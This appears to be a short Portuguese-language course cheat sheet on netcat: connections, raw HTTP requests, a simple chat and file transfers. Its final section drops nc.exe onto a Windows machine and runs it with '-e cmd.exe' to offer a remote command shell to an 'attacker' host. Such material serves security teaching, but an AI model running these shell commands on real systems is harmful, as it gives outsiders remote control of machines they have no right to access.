# FIAP-Cyber

## Resumo de Comandos

### Instalação e Configuração

- Instalar o Netcat:
apt install netcat

- Iniciar um servidor HTTP em Python na porta 8080:
python3 -m http.server 8080

### Comandos Básicos

- Estabelecer uma conexão TCP com um host:
nc -v 192.168.1.10 8080

- Mostrar informações detalhadas sobre as conexões:
OPTIONS / HTTP/1.0
GET / HTTP/1.1

- Mostrar as conexões de rede:
netstat -nltp

### Manter Conexão com o Servidor

- Enviar uma requisição OPTIONS e manter a conexão:
printf "OPTIONS / HTTP/1.0\r\n\r\n" | nc 192.168.1.10 80

- Verificar o IP do webserver em Python:
ip -br -c a

### Chat Simples

- Abrir uma porta para o servidor:
nc -lvp 1234

- Interagir com a porta do servidor:
nc -v 192.168.1.10 1234

### Transferência de Arquivos

- Criar e enviar um arquivo do servidor para o cliente:
echo "P4sswd" > senha.txt
cat senha.txt | nc -lvp 1234
nc -v 192.168.1.10 1234 > passwd.txt

- Exibir o hash MD5 do arquivo:
md5sum senha.txt


### Transferência de Executáveis

- Transferir o arquivo nc.exe para uma máquina Windows:
python3 -m http.server 1234
nc -nv 192.168.1.30 4444

- Abrir uma porta no lado do cliente para executar o nc.exe e conectar à máquina do atacante:
nc.exe -nvlp 4444 -e cmd.exe

Certifique-se de adaptar os endereços IP e portas conforme necessário para sua configuração.
